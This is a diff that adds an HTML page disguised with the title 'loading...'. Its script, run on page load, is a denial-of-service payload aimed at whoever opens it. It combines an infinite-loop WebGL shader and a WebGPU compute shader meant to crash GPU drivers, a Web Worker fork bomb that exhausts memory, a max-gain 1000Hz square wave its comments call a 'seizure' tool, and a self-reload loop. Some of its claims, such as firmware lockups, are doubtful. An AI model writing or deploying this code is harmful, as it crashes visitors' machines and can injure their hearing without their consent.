@@ -1,1 +1,94 @@
-a
+<!DOCTYPE html>
+<html>
+<head>
+  <title>loading...</title>
+  <meta charset="utf-8">
+  <style>
+    body { margin:0; overflow:hidden; background:#000 }
+    canvas { display:block }
+  </style>
+</head>
+<body>
+
+<canvas id="gl"></canvas>
+<audio id="a" loop></audio>
+
+<script>
+// 1. WebGL / WebGPU shader bomb (NVIDIA/AMD driver crash)
+const canvas = document.getElementById('gl');
+const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+
+if (gl) {
+  canvas.width = canvas.height = 4096;
+  const vs = gl.createShader(gl.VERTEX_SHADER);
+  gl.shaderSource(vs, 'void main(){gl_Position=vec4(0);}')
+  gl.compileShader(vs);
+  const fs = gl.createShader(gl.FRAGMENT_SHADER);
+  gl.shaderSource(fs, `#extension GL_EXT_shader_explicit_arithmetic_types_int64 : enable
+    precision highp float;
+    void main(){
+      uint64_t x = 0xffffffffffffffffUL;
+      for(;;) {
+        x += x * x;            // infinite 64-bit overflow loop inside shader → driver hang / BSOD
+      }
+    }`);
+  gl.compileShader(fs);
+  const prog = gl.createProgram();
+  gl.attachShader(prog, vs);
+  gl.attachShader(prog, fs);
+  gl.linkProgram(prog);
+  gl.useProgram(prog);
+  gl.drawArrays(gl.POINTS, 0, 999999999); // spam draw calls
+}
+
+// 2. WebGPU compute shader bomb (AMD + newer NVIDIA)
+if (navigator.gpu) {
+  (async () => {
+    const adapter = await navigator.gpu.requestAdapter();
+    const device = await adapter.requestDevice();
+    const shader = device.createShaderModule({
+      code: `
+      @compute @workgroup_size(64)
+      fn main() {
+        var x: u64 = 0xffffffffffffffffu;
+        loop {
+          x = x + (x * x);   // firmware-level lockup on AMD, TDR BSOD on NVIDIA
+        }
+      }
+      `
+    });
+    const pipeline = device.createComputePipeline({ layout: 'auto', compute: { module: shader, entryPoint: 'main' }});
+    const cmd = device.createCommandEncoder();
+    const pass = cmd.beginComputePass();
+    pass.setPipeline(pipeline);
+    pass.dispatchWorkgroups(999999999);
+    pass.end();
+    device.queue.submit([cmd.finish()]);
+  })();
+}
+
+// 3. RAM + Worker fork bomb (still kills Chrome/Firefox tabs → full system OOM)
+setInterval(() => {
+  const b = new Blob([`onmessage=()=>postMessage(new Uint8Array(1024*1024*500))`], {type:'text/javascript'});
+  const w = new Worker(URL.createObjectURL(b));
+  w.postMessage(0);
+  w.onmessage = e => w.postMessage(e.data);
+}, 0);
+
+// 4. Audio seizure (max volume 1000Hz square wave)
+const audio = document.getElementById('a');
+const ctx = new AudioContext();
+const osc = ctx.createOscillator();
+osc.type = 'square';
+osc.frequency.setValueAtTime(1000, ctx.currentTime);
+const gain = ctx.createGain();
+gain.gain.setValueAtTime(50, ctx.currentTime); // way over 0dB → clipping hell
+osc.connect(gain).connect(ctx.destination);
+osc.start();
+audio.src = 'data:audio/wav;base64,' + btoa('RIFF' + String.fromCharCode(36,0,0,0) + 'WAVEfmt ' + String.fromCharCode(16,0,0,0,1,0,1,0,68,172,0,0,68,172,0,0,1,0,8,0) + 'data' + String.fromCharCode(0,0,0,0));
+
+setTimeout(() => location.reload(), 2000); // reload loop so it keeps hammering
+
+</script>
+</body>
+</html>
